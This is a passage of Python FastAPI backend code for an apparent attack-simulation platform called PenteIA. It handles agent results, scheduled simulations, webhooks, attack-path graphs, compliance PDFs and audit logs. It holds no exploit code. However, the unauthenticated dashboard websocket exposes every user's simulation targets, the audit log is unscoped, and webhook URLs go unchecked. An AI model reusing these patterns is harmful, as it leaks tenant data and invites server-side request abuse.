            AgentTask.agent_id == agent_id,
            AgentTask.technique == tech,
            AgentTask.status.in_(["pending", "running"]),
        ).first()
        if existing:
            existing.result = r
            existing.status = "completed"
            existing.completed_at = datetime.utcnow()
        else:
            t = AgentTask(
                agent_id=agent_id,
                technique=tech,
                status="completed",
                result=r,
                completed_at=datetime.utcnow(),
            )
            db.add(t)
    db.commit()
    return {"message": "Batch salvo", "count": len(req.results)}

@app.get("/api/agents/{agent_id}/results")
async def agent_results(
    agent_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    agent = db.query(PenteiaAgent).filter(
        PenteiaAgent.id == agent_id,
        PenteiaAgent.user_id == current_user.id,
    ).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")
    tasks = db.query(AgentTask).filter(
        AgentTask.agent_id == agent_id,
        AgentTask.status == "completed",
    ).order_by(AgentTask.completed_at.desc()).all()
    return {
        "agent": {
            "id": agent.id, "hostname": agent.hostname,
            "ip": agent.ip, "os_info": agent.os_info,
        },
        "results": [
            {
                "task_id":       t.id,
                "technique":     t.technique,
                "completed_at":  t.completed_at.isoformat() if t.completed_at else None,
                **t.result,
            }
            for t in tasks
        ],
    }

@app.delete("/api/agents/{agent_id}")
async def agent_delete(
    agent_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    agent = db.query(PenteiaAgent).filter(
        PenteiaAgent.id == agent_id,
        PenteiaAgent.user_id == current_user.id,
    ).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")
    db.delete(agent)
    db.commit()
    return {"message": "Agente removido"}


# ── Webhook helpers ──────────────────────────────────────────────────────────

def _fire_webhooks_sync(user_id: str, event: str, payload: dict):
    """Dispara webhooks configurados para o user em thread separada."""
    def _do():
        db3 = SessionLocal()
        try:
            configs = db3.query(WebhookConfig).filter(
                WebhookConfig.user_id == user_id,
                WebhookConfig.enabled == True,
            ).all()
            for cfg in configs:
                if event not in (cfg.events or []):
                    continue
                body = json.dumps(payload).encode()
                headers = {"Content-Type": "application/json", "X-PenteIA-Event": event}
                if cfg.secret:
                    sig = _hmac.new(cfg.secret.encode(), body, _hashlib.sha256).hexdigest()
                    headers["X-PenteIA-Signature"] = f"sha256={sig}"
                try:
                    _requests.post(cfg.url, data=body, headers=headers, timeout=8)
                except Exception:
                    pass
        finally:
            db3.close()
    threading.Thread(target=_do, daemon=True).start()


# ── Scheduled Scans ───────────────────────────────────────────────────────────

def _interval_days(interval: str) -> int:
    return {"daily": 1, "weekly": 7, "monthly": 30}.get(interval, 7)


def _run_scheduled_sim(scan_id: str):
    """Função chamada pelo APScheduler para executar simulação agendada."""
    db4 = SessionLocal()
    try:
        scan = db4.query(ScheduledScan).filter(ScheduledScan.id == scan_id).first()
        if not scan or not scan.enabled:
            return
        playbook = db4.query(Playbook).filter(Playbook.id == scan.playbook_id).first()
        if not playbook:
            return
        sim = Simulation(
            user_id=scan.user_id,
            playbook_id=scan.playbook_id,
            target=scan.target,
            status="running",
            score=0.0,
        )
        db4.add(sim)
        db4.commit()
        db4.refresh(sim)
        threading.Thread(
            target=_bas_run,
            args=(sim.id, playbook.name, scan.target, playbook.severity, playbook.techniques),
            daemon=True,
        ).start()
        # Atualizar next_run
        days = _interval_days(scan.interval)
        scan.next_run = datetime.utcnow() + timedelta(days=days)
        db4.commit()
    finally:
        db4.close()


def _kev_check_job():
    """
    Scheduled job: checks CISA KEV for new entries every 6 hours.
    If new CVEs are added to KEV, logs a warning — future: trigger BAS for affected clients.
    """
    import logging as _log
    _kl = _log.getLogger("penteia.kev")
    try:
        from epss_engine import get_kev_diff
        diff = get_kev_diff()
        new_entries = diff.get("new_entries", [])
        if new_entries:
            _kl.warning(
                "KEV ALERT: %d new CVEs added to CISA KEV: %s",
                len(new_entries), new_entries[:10]
            )
        else:
            _kl.info("KEV check: no new entries (total: %d)", diff.get("total_current", 0))
    except Exception as exc:
        _log.getLogger("penteia.kev").error("KEV check job failed: %s", exc)


@app.get("/api/schedule")
async def list_schedules(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    scans = db.query(ScheduledScan).filter(ScheduledScan.user_id == current_user.id).all()
    return {"schedules": [
        {
            "id": s.id,
            "playbook_id": s.playbook_id,
            "target": s.target,
            "interval": s.interval,
            "next_run": s.next_run.isoformat() if s.next_run else None,
            "last_run": s.last_run.isoformat() if s.last_run else None,
            "enabled": s.enabled,
            "created_at": s.created_at.isoformat(),
        }
        for s in scans
    ]}


@app.post("/api/schedule")
async def create_schedule(
    req: ScheduleCreateRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    playbook = db.query(Playbook).filter(
        Playbook.id == req.playbook_id, Playbook.user_id == current_user.id
    ).first()
    if not playbook:
        raise HTTPException(status_code=404, detail="Playbook não encontrado")
    if req.interval not in ("daily", "weekly", "monthly"):
        raise HTTPException(status_code=400, detail="Intervalo inválido. Use: daily, weekly, monthly")

    days = _interval_days(req.interval)
    next_run = datetime.utcnow() + timedelta(days=days)

    scan = ScheduledScan(
        user_id=current_user.id,
        playbook_id=req.playbook_id,
        target=req.target,
        interval=req.interval,
        next_run=next_run,
        enabled=True,
    )
    db.add(scan)
    db.commit()
    db.refresh(scan)

    if _scheduler:
        _scheduler.add_job(
            _run_scheduled_sim,
            trigger="interval",
            days=days,
            id=scan.id,
            args=[scan.id],
            replace_existing=True,
        )

    _operation_logs.append({
        "module": "BAS", "action": "Simulação agendada",
        "details": f"{playbook.name} → {req.target} ({req.interval})",
        "timestamp": datetime.utcnow().isoformat(),
    })
    return {"id": scan.id, "next_run": next_run.isoformat(), "message": "Agendamento criado"}


@app.patch("/api/schedule/{scan_id}")
async def toggle_schedule(
    scan_id: str,
    req: ScheduleToggleRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    scan = db.query(ScheduledScan).filter(
        ScheduledScan.id == scan_id, ScheduledScan.user_id == current_user.id
    ).first()
    if not scan:
        raise HTTPException(status_code=404, detail="Agendamento não encontrado")
    scan.enabled = req.enabled
    db.commit()
    if _scheduler:
        if req.enabled:
            days = _interval_days(scan.interval)
            _scheduler.add_job(_run_scheduled_sim, trigger="interval", days=days,
                               id=scan.id, args=[scan.id], replace_existing=True)
        else:
            try:
                _scheduler.remove_job(scan.id)
            except Exception:
                pass
    return {"id": scan_id, "enabled": req.enabled}


@app.delete("/api/schedule/{scan_id}")
async def delete_schedule(
    scan_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    scan = db.query(ScheduledScan).filter(
        ScheduledScan.id == scan_id, ScheduledScan.user_id == current_user.id
    ).first()
    if not scan:
        raise HTTPException(status_code=404, detail="Agendamento não encontrado")
    if _scheduler:
        try:
            _scheduler.remove_job(scan.id)
        except Exception:
            pass
    db.delete(scan)
    db.commit()
    return {"message": "Agendamento removido"}


# ── Webhooks ──────────────────────────────────────────────────────────────────

@app.get("/api/webhooks")
async def list_webhooks(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    hooks = db.query(WebhookConfig).filter(WebhookConfig.user_id == current_user.id).all()
    return {"webhooks": [
        {
            "id": h.id,
            "name": h.name,
            "url": h.url[:40] + "..." if len(h.url) > 40 else h.url,
            "events": h.events,
            "enabled": h.enabled,
            "has_secret": bool(h.secret),
            "created_at": h.created_at.isoformat(),
        }
        for h in hooks
    ]}


@app.post("/api/webhooks")
async def create_webhook(
    req: WebhookCreateRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    hook = WebhookConfig(
        user_id=current_user.id,
        name=req.name,
        url=req.url,
        events=req.events,
        secret=req.secret,
        enabled=True,
    )
    db.add(hook)
    db.commit()
    db.refresh(hook)
    _operation_logs.append({"module": "ADMIN", "action": "Webhook criado", "details": req.name, "timestamp": datetime.utcnow().isoformat()})
    return {"id": hook.id, "message": "Webhook criado"}


@app.post("/api/webhooks/{hook_id}/test")
async def test_webhook(
    hook_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    hook = db.query(WebhookConfig).filter(
        WebhookConfig.id == hook_id, WebhookConfig.user_id == current_user.id
    ).first()
    if not hook:
        raise HTTPException(status_code=404, detail="Webhook não encontrado")
    test_payload = {
        "event": "test",
        "message": "PenteIA webhook test ping",
        "timestamp": datetime.utcnow().isoformat(),
    }
    body = json.dumps(test_payload).encode()
    headers = {"Content-Type": "application/json", "X-PenteIA-Event": "test"}
    if hook.secret:
        sig = _hmac.new(hook.secret.encode(), body, _hashlib.sha256).hexdigest()
        headers["X-PenteIA-Signature"] = f"sha256={sig}"
    try:
        r = _requests.post(hook.url, data=body, headers=headers, timeout=8)
        return {"status": r.status_code, "message": f"Webhook respondeu com HTTP {r.status_code}"}
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"Falha ao contactar webhook: {e}")


@app.delete("/api/webhooks/{hook_id}")
async def delete_webhook(
    hook_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    hook = db.query(WebhookConfig).filter(
        WebhookConfig.id == hook_id, WebhookConfig.user_id == current_user.id
    ).first()
    if not hook:
        raise HTTPException(status_code=404, detail="Webhook não encontrado")
    db.delete(hook)
    db.commit()
    return {"message": "Webhook removido"}


# ── Attack Path Graph ─────────────────────────────────────────────────────────

@app.get("/api/bas/simulations/{sim_id}/graph")
async def simulation_graph(
    sim_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    sim = db.query(Simulation).filter(
        Simulation.id == sim_id, Simulation.user_id == current_user.id
    ).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")

    res = sim.results or {}
    techniques = res.get("techniques", [])
    target = res.get("target", sim.target)

    nodes = [
        {"id": "attacker", "type": "input", "data": {"label": "Atacante (Internet)", "type": "attacker"}, "position": {"x": 0, "y": 200}},
        {"id": "target", "type": "output", "data": {"label": target, "type": "server"}, "position": {"x": 800, "y": 200}},
    ]
    edges = []

    # Agrupar por tática para posicionamento em colunas
    tactic_order = [
        "RECONNAISSANCE", "INITIAL_ACCESS", "EXECUTION", "PRIVILEGE_ESCALATION",
        "DEFENSE_EVASION", "CREDENTIAL_ACCESS", "LATERAL_MOVEMENT", "COLLECTION",
        "EXFILTRATION", "IMPACT",
    ]
    by_tactic: dict = {}
    for t in techniques:
        tac = t.get("tactic", "UNKNOWN")
        by_tactic.setdefault(tac, []).append(t)

    col_x = 160
    for tac in tactic_order:
        tac_techs = by_tactic.pop(tac, [])
        if not tac_techs:
            continue
        n_in_col = len(tac_techs)
        for i, t in enumerate(tac_techs):
            tid = t.get("id", f"T_{i}")
            node_id = f"{tid}_{col_x}"
            status = t.get("status", "unknown")
            color = "#e74c3c" if status == "found" else "#2ecc71" if status == "blocked" else "#95a5a6"
            y_pos = 50 + i * 90 - (n_in_col - 1) * 45
            nodes.append({
                "id": node_id,
                "data": {
                    "label": f"{tid}\n{t.get('name', '')[:28]}",
                    "status": status,
                    "severity": t.get("cvss_severity", ""),
                    "cvss": t.get("cvss_score", 0),
                    "detail": t.get("detail", ""),
                    "compliance": t.get("compliance", []),
                    "remediation": t.get("remediation", ""),
                    "color": color,
                },
                "position": {"x": col_x, "y": y_pos},
                "style": {"border": f"2px solid {color}", "background": f"{color}22"},
            })
            # Edge: attacker → technique (found), ou técnica → target (blocked)
            if status == "found":
                edges.append({
                    "id": f"e_att_{node_id}",
                    "source": "attacker",
                    "target": node_id,
                    "animated": True,
                    "style": {"stroke": "#e74c3c"},
                })
                edges.append({
                    "id": f"e_{node_id}_tgt",
                    "source": node_id,
                    "target": "target",
                    "animated": True,
                    "style": {"stroke": "#e74c3c"},
                })
            else:
                edges.append({
                    "id": f"e_att_{node_id}",
                    "source": "attacker",
                    "target": node_id,
                    "animated": False,
                    "style": {"stroke": "#2ecc71", "strokeDasharray": "5,5"},
                })
        col_x += 160

    # Restantes sem tática mapeada
    for tac, tac_techs in by_tactic.items():
        for i, t in enumerate(tac_techs):
            tid = t.get("id", f"T_{i}")
            node_id = f"{tid}_{col_x}"
            status = t.get("status", "unknown")
            color = "#e74c3c" if status == "found" else "#2ecc71" if status == "blocked" else "#95a5a6"
            nodes.append({
                "id": node_id,
                "data": {"label": f"{tid}\n{t.get('name', '')[:28]}", "status": status, "color": color},
                "position": {"x": col_x, "y": 50 + i * 90},
                "style": {"border": f"2px solid {color}", "background": f"{color}22"},
            })

    summary = {
        "total": len(techniques),
        "found": sum(1 for t in techniques if t.get("status") == "found"),
        "blocked": sum(1 for t in techniques if t.get("status") == "blocked"),
        "score": sim.score,
        "detection_coverage_pct": res.get("detection_coverage_pct", 0),
    }

    return {"nodes": nodes, "edges": edges, "summary": summary}


# ── Compliance Reports ────────────────────────────────────────────────────────

_COMPLIANCE_MAPPINGS = {
    "lgpd": {
        "title": "Relatório de Compliance — LGPD (Lei 13.709/2018)",
        "subtitle": "Mapeamento de Vulnerabilidades aos Artigos da LGPD",
        "framework_desc": "A Lei Geral de Proteção de Dados (LGPD) exige que organizações adotem medidas técnicas e administrativas para proteger dados pessoais.",
        "controls": [
            {"id": "Art. 46", "name": "Medidas de Segurança Técnicas", "desc": "Medidas para proteger dados pessoais de acessos não autorizados e situações acidentais ou ilícitas.", "techniques": ["T1190", "T1190b", "T1190c", "T1059", "T1083", "T1552"]},
            {"id": "Art. 47", "name": "Confidencialidade por Agentes", "desc": "Obrigação de sigilo e confidencialidade no tratamento de dados pessoais.", "techniques": ["T1087", "T1087b", "T1185", "T1557", "T1552"]},
            {"id": "Art. 48", "name": "Comunicação de Incidentes", "desc": "Obrigação de comunicar incidentes de segurança que possam acarretar risco ou dano.", "techniques": ["T1485", "T1486", "T1190e", "T1499"]},
            {"id": "Art. 49", "name": "Sistemas Seguros por Design", "desc": "Sistemas projetados com medidas de segurança desde a concepção.", "techniques": ["T1592", "T1602", "T1592b", "T1595"]},
        ],
    },
    "iso27001": {
        "title": "Relatório de Compliance — ISO/IEC 27001:2022",
        "subtitle": "Mapeamento de Vulnerabilidades aos Controles do Annex A",
        "framework_desc": "A ISO/IEC 27001:2022 define controles de segurança da informação organizados no Annex A para gestão de riscos.",
        "controls": [
            {"id": "A.8.8", "name": "Gestão de Vulnerabilidades Técnicas", "desc": "Identificação e tratamento tempestivo de vulnerabilidades técnicas.", "techniques": ["T1190", "T1190b", "T1190c", "T1059", "T1083"]},
            {"id": "A.8.20", "name": "Segurança de Redes", "desc": "Gerenciamento e controle de redes para proteger informações em sistemas e aplicações.", "techniques": ["T1040", "T1595", "T1595b", "T1590", "T1557"]},
            {"id": "A.8.29", "name": "Testes de Segurança no Desenvolvimento", "desc": "Testes de segurança integrados ao ciclo de desenvolvimento.", "techniques": ["T1078", "T1110", "T1078b", "T1185"]},
            {"id": "A.8.12", "name": "Prevenção de Vazamento de Dados", "desc": "Medidas para prevenir a divulgação não autorizada de informações sensíveis.", "techniques": ["T1087", "T1087b", "T1592b", "T1552"]},
            {"id": "A.8.23", "name": "Filtragem Web", "desc": "Gerenciamento de acesso a sites externos para reduzir exposição a conteúdo malicioso.", "techniques": ["T1190e", "T1602", "T1592"]},
        ],
    },
    "pcidss": {
        "title": "Relatório de Compliance — PCI DSS 4.0",
        "subtitle": "Mapeamento de Vulnerabilidades aos Requisitos PCI DSS",
        "framework_desc": "O PCI DSS (Payment Card Industry Data Security Standard) v4.0 define requisitos de segurança para ambientes que processam dados de cartão de pagamento.",
        "controls": [
            {"id": "Req. 6.3", "name": "Vulnerabilidades de Segurança Identificadas e Endereçadas", "desc": "Manter componentes de sistema protegidos contra vulnerabilidades conhecidas.", "techniques": ["T1190", "T1190b", "T1059", "T1083"]},
            {"id": "Req. 11.3", "name": "Testes de Penetração Externos e Internos", "desc": "Realizar testes de penetração pelo menos anualmente e após mudanças significativas.", "techniques": ["T1595", "T1595b", "T1590", "T1592"]},
            {"id": "Req. 8.2", "name": "Identificação de Usuário e Autenticação", "desc": "Gerenciar identificação de usuários e autenticação para usuários e administradores.", "techniques": ["T1110", "T1078", "T1078b", "T1185", "T1190c"]},
            {"id": "Req. 6.4", "name": "Aplicações Web Expostas à Internet Protegidas", "desc": "WAF ou revisão manual de código para aplicações web públicas.", "techniques": ["T1190", "T1059", "T1190e", "T1190b", "T1190c"]},
            {"id": "Req. 10.2", "name": "Logs de Auditoria Implementados", "desc": "Implementar logs de auditoria para reconstruir atividades suspeitas.", "techniques": ["T1592b", "T1602", "T1557"]},
        ],
    },
}


@app.post("/api/reporting/compliance")
async def generate_compliance_report(
    req: ComplianceReportRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    framework = req.framework.lower()
    if framework not in _COMPLIANCE_MAPPINGS:
        raise HTTPException(status_code=400, detail="Framework inválido. Use: lgpd, iso27001, pcidss")

    # Buscar simulação
    if req.simulation_id:
        sim = db.query(Simulation).filter(
            Simulation.id == req.simulation_id, Simulation.user_id == current_user.id
        ).first()
        if not sim:
            raise HTTPException(status_code=404, detail="Simulação não encontrada")
    else:
        sim = db.query(Simulation).filter(
            Simulation.user_id == current_user.id,
            Simulation.status == "completed",
        ).order_by(Simulation.date.desc()).first()
        if not sim:
            raise HTTPException(status_code=404, detail="Nenhuma simulação completada encontrada")

    mapping = _COMPLIANCE_MAPPINGS[framework]
    techniques = (sim.results or {}).get("techniques", [])
    found_ids = {t.get("id") for t in techniques if t.get("status") == "found"}

    # Gerar PDF de compliance
    pdf_bytes = _build_compliance_pdf(mapping, techniques, found_ids, sim, current_user.username)

    title = f"compliance_{framework}_{sim.id[:8]}"
    report = Report(
        user_id=current_user.id,
        title=title,
        type=f"compliance_{framework}",
        format="pdf",
        content=pdf_bytes,
    )
    db.add(report)
    db.commit()
    db.refresh(report)

    return StreamingResponse(
        io.BytesIO(pdf_bytes),
        media_type="application/pdf",
        headers={"Content-Disposition": f'attachment; filename="{title}.pdf"'},
    )


def _build_compliance_pdf(mapping: dict, techniques: list, found_ids: set, sim, username: str) -> bytes:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib import colors
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import cm
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable, PageBreak

    buf = io.BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=A4, leftMargin=2*cm, rightMargin=2*cm,
                            topMargin=2*cm, bottomMargin=2*cm)
    styles = getSampleStyleSheet()
    C = colors.HexColor
    NAVY = C("#0B1426"); TEAL = C("#00BCD4"); WHT = colors.white
    RED = C("#e74c3c"); GRN = C("#27ae60"); GRY = C("#7f8c8d")

    story = []
    W = A4[0] - 4*cm

    # Capa
    story.append(Spacer(1, 1*cm))
    story.append(Paragraph(mapping["title"],
        ParagraphStyle("ct", fontSize=18, textColor=NAVY, fontName="Helvetica-Bold", spaceAfter=6)))
    story.append(Paragraph(mapping["subtitle"],
        ParagraphStyle("cs", fontSize=12, textColor=TEAL, fontName="Helvetica", spaceAfter=12)))
    story.append(HRFlowable(width=W, color=TEAL, thickness=2))
    story.append(Spacer(1, 0.5*cm))

    # Meta
    found_count = sum(1 for t in techniques if t.get("status") == "found")
    blocked_count = sum(1 for t in techniques if t.get("status") == "blocked")
    meta = [
        ["Organização:", username],
        ["Target avaliado:", sim.target],
        ["Data da avaliação:", sim.date.strftime("%d/%m/%Y %H:%M") if sim.date else "—"],
        ["Score de risco:", f"{sim.score:.1f}%"],
        ["Técnicas testadas:", str(len(techniques))],
        ["Vulnerabilidades encontradas:", str(found_count)],
        ["Controles ativos:", str(blocked_count)],
        ["Framework:", mapping["title"].split("—")[-1].strip()],
    ]
    t_meta = Table(meta, colWidths=[5*cm, W - 5*cm])
    t_meta.setStyle(TableStyle([
        ("FONTNAME", (0, 0), (0, -1), "Helvetica-Bold"),
        ("FONTNAME", (1, 0), (1, -1), "Helvetica"),
        ("FONTSIZE", (0, 0), (-1, -1), 9),
        ("TEXTCOLOR", (0, 0), (0, -1), NAVY),
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [C("#F0F4F8"), WHT]),
        ("GRID", (0, 0), (-1, -1), 0.3, C("#DDDDDD")),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
    ]))
    story.append(t_meta)
    story.append(Spacer(1, 0.5*cm))
    story.append(Paragraph(mapping["framework_desc"],
        ParagraphStyle("fd", fontSize=9, textColor=C("#444444"), leading=13)))
    story.append(PageBreak())

    # Controles
    story.append(Paragraph("Mapeamento de Vulnerabilidades por Controle",
        ParagraphStyle("h1", fontSize=14, textColor=NAVY, fontName="Helvetica-Bold", spaceAfter=8)))
    story.append(HRFlowable(width=W, color=TEAL, thickness=1.5))
    story.append(Spacer(1, 0.3*cm))

    for ctrl in mapping["controls"]:
        # Identificar técnicas vulneráveis neste controle
        ctrl_found = [t for t in techniques if t.get("id") in ctrl["techniques"] and t.get("status") == "found"]
        ctrl_blocked = [t for t in techniques if t.get("id") in ctrl["techniques"] and t.get("status") == "blocked"]
        tested_ids = {t.get("id") for t in techniques if t.get("id") in ctrl["techniques"]}
        status_text = "CONFORME" if not ctrl_found else "NÃO CONFORME"
        status_color = GRN if not ctrl_found else RED

        # Header do controle
        ctrl_header = Table([[
            Paragraph(f"{ctrl['id']} — {ctrl['name']}",
                ParagraphStyle("ch", fontSize=10, textColor=WHT, fontName="Helvetica-Bold")),
            Paragraph(status_text,
                ParagraphStyle("cs2", fontSize=9, textColor=WHT, fontName="Helvetica-Bold", alignment=2)),
        ]], colWidths=[W*0.75, W*0.25])
        ctrl_header.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, -1), status_color if ctrl_found else NAVY),
            ("TOPPADDING", (0, 0), (-1, -1), 6),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
            ("LEFTPADDING", (0, 0), (0, -1), 8),
        ]))
        story.append(ctrl_header)
        story.append(Paragraph(ctrl["desc"],
            ParagraphStyle("cd", fontSize=8, textColor=C("#444444"), leading=12,
                           leftIndent=8, spaceAfter=4, spaceBefore=4)))

        if not tested_ids:
            story.append(Paragraph("Nenhuma técnica relacionada a este controle foi testada nesta simulação.",
                ParagraphStyle("na", fontSize=8, textColor=GRY, leftIndent=8, spaceAfter=6)))
        else:
            rows = [["Técnica", "Nome", "Status", "CVSS"]]
            for t in techniques:
                if t.get("id") not in ctrl["techniques"]:
                    continue
                s = t.get("status", "unknown")
                s_label = "✓ Protegido" if s == "blocked" else "✗ Vulnerável" if s == "found" else "? Desconhecido"
                rows.append([t.get("id", ""), t.get("name", "")[:40], s_label, f"{t.get('cvss_score', 0):.1f}"])
            t_ctrl = Table(rows, colWidths=[2*cm, W*0.5 - 2*cm, 2.8*cm, 1.5*cm])
            style_rows = [
                ("BACKGROUND", (0, 0), (-1, 0), NAVY),
                ("TEXTCOLOR", (0, 0), (-1, 0), WHT),
                ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
                ("FONTSIZE", (0, 0), (-1, -1), 8),
                ("GRID", (0, 0), (-1, -1), 0.3, C("#DDDDDD")),
                ("TOPPADDING", (0, 0), (-1, -1), 3),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 3),
                ("LEFTPADDING", (0, 0), (-1, -1), 4),
            ]
            for i, row in enumerate(rows[1:], 1):
                if "Vulnerável" in row[2]:
                    style_rows.append(("BACKGROUND", (0, i), (-1, i), C("#FDECEC")))
                    style_rows.append(("TEXTCOLOR", (2, i), (2, i), RED))
                else:
                    style_rows.append(("BACKGROUND", (0, i), (-1, i), C("#EDFDF4") if i % 2 == 0 else WHT))
                    style_rows.append(("TEXTCOLOR", (2, i), (2, i), GRN))
            t_ctrl.setStyle(TableStyle(style_rows))
            story.append(t_ctrl)
        story.append(Spacer(1, 0.4*cm))

    # Sumário de conformidade
    story.append(PageBreak())
    story.append(Paragraph("Sumário de Conformidade",
        ParagraphStyle("h2", fontSize=14, textColor=NAVY, fontName="Helvetica-Bold", spaceAfter=8)))
    story.append(HRFlowable(width=W, color=TEAL, thickness=1.5))
    story.append(Spacer(1, 0.3*cm))

    total_ctrl = len(mapping["controls"])
    conforme = sum(1 for c in mapping["controls"]
                   if not any(t for t in techniques if t.get("id") in c["techniques"] and t.get("status") == "found"))
    nao_conforme = total_ctrl - conforme
    pct = round(conforme / max(total_ctrl, 1) * 100)

    summary_data = [
        ["Total de Controles Avaliados", str(total_ctrl)],
        ["Controles Conformes", str(conforme)],
        ["Controles Não Conformes", str(nao_conforme)],
        ["Índice de Conformidade", f"{pct}%"],
    ]
    t_sum = Table(summary_data, colWidths=[W * 0.6, W * 0.4])
    t_sum.setStyle(TableStyle([
        ("FONTNAME", (0, 0), (0, -1), "Helvetica-Bold"),
        ("FONTNAME", (1, 0), (1, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 10),
        ("TEXTCOLOR", (0, 0), (0, -1), NAVY),
        ("TEXTCOLOR", (1, 3), (1, 3), GRN if pct >= 70 else RED),
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [C("#F0F4F8"), WHT]),
        ("GRID", (0, 0), (-1, -1), 0.3, C("#DDDDDD")),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (0, -1), 8),
        ("ALIGN", (1, 0), (1, -1), "CENTER"),
    ]))
    story.append(t_sum)
    story.append(Spacer(1, 0.5*cm))
    verdict = (f"Com {pct}% de conformidade, a organização apresenta "
               + ("boa aderência ao framework." if pct >= 70 else
                  "necessidade de melhoria em vários controles." if pct >= 40 else
                  "lacunas críticas que requerem ação imediata."))
    story.append(Paragraph(verdict,
        ParagraphStyle("vv", fontSize=10, textColor=NAVY, leading=14)))

    doc.build(story)
    return buf.getvalue()


# ── WebSocket Dashboard ───────────────────────────────────────────────────────

@app.websocket("/ws/dashboard")
async def ws_dashboard(websocket: WebSocket):
    await websocket.accept()
    _ws_clients.add(websocket)
    try:
        db_ws = SessionLocal()
        try:
            # Send initial state
            sims = db_ws.query(Simulation).order_by(Simulation.date.desc()).limit(5).all()
            await websocket.send_json({
                "type": "init",
                "simulations": [{"id": s.id, "status": s.status, "score": s.score, "target": s.target} for s in sims],
                "timestamp": datetime.utcnow().isoformat(),
            })
        finally:
            db_ws.close()
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_json({"type": "pong", "timestamp": datetime.utcnow().isoformat()})
    except WebSocketDisconnect:
        _ws_clients.discard(websocket)
    except Exception:
        _ws_clients.discard(websocket)


async def _ws_broadcast(msg: dict):
    dead = set()
    for ws in list(_ws_clients):
        try:
            await ws.send_json(msg)
        except Exception:
            dead.add(ws)
    _ws_clients.difference_update(dead)


# ── Notifications ─────────────────────────────────────────────────────────────

class NotificationCreateRequest(BaseModel):
    title: str
    message: str
    type: str = "info"

@app.get("/api/notifications")
async def list_notifications(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    notifs = db.query(Notification).filter(
        Notification.user_id == current_user.id
    ).order_by(Notification.created_at.desc()).limit(50).all()
    unread = sum(1 for n in notifs if not n.read)
    return {
        "notifications": [
            {"id": n.id, "title": n.title, "message": n.message, "type": n.type,
             "read": n.read, "created_at": n.created_at.isoformat()}
            for n in notifs
        ],
        "unread_count": unread,
    }

@app.patch("/api/notifications/{notif_id}/read")
async def mark_notification_read(notif_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    n = db.query(Notification).filter(Notification.id == notif_id, Notification.user_id == current_user.id).first()
    if not n:
        raise HTTPException(status_code=404, detail="Notificação não encontrada")
    n.read = True
    db.commit()
    return {"message": "ok"}

@app.post("/api/notifications/mark-all-read")
async def mark_all_notifications_read(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    db.query(Notification).filter(Notification.user_id == current_user.id, Notification.read == False).update({"read": True})
    db.commit()
    return {"message": "ok"}


def _create_notification(db: Session, user_id: str, title: str, message: str, ntype: str = "info"):
    n = Notification(user_id=user_id, title=title, message=message, type=ntype)
    db.add(n)
    db.commit()


# ── Audit Log (persistent) ────────────────────────────────────────────────────

def _audit(db: Session, module: str, action: str, details: str = "", user_id: str = None):
    log = AuditLog(module=module, action=action, details=details, user_id=user_id)
    db.add(log)
    db.commit()
    _operation_logs.append({"module": module, "action": action, "details": details, "timestamp": datetime.utcnow().isoformat()})

@app.get("/api/audit-log")
async def get_audit_log(
    limit: int = 100,
    module: Optional[str] = None,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    q = db.query(AuditLog).order_by(AuditLog.created_at.desc())
    if module:
        q = q.filter(AuditLog.module == module)
    logs = q.limit(limit).all()
    return {"logs": [
        {"id": l.id, "module": l.module, "action": l.action, "details": l.details, "created_at": l.created_at.isoformat()}
        for l in logs
    ]}


# ── MITRE ATT&CK Matrix endpoint ──────────────────────────────────────────────

@app.get("/api/bas/attck-matrix")
async def attck_matrix(
    simulation_id: Optional[str] = None,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    from bas_engine import ALL_TECHNIQUES

    TACTIC_META = {
        "RECONNAISSANCE":       ("TA0043", "RECON"),
        "RESOURCE_DEVELOPMENT": ("TA0042", "RESOURCE"),
        "INITIAL_ACCESS":       ("TA0001", "INIT ACCESS"),
        "EXECUTION":            ("TA0002", "EXEC"),
        "PERSISTENCE":          ("TA0003", "PERSIST"),
        "PRIVILEGE_ESCALATION": ("TA0004", "PRIV ESC"),
        "DEFENSE_EVASION":      ("TA0005", "DEF EVASION"),
        "CREDENTIAL_ACCESS":    ("TA0006", "CRED ACCESS"),
        "DISCOVERY":            ("TA0007", "DISCOVERY"),
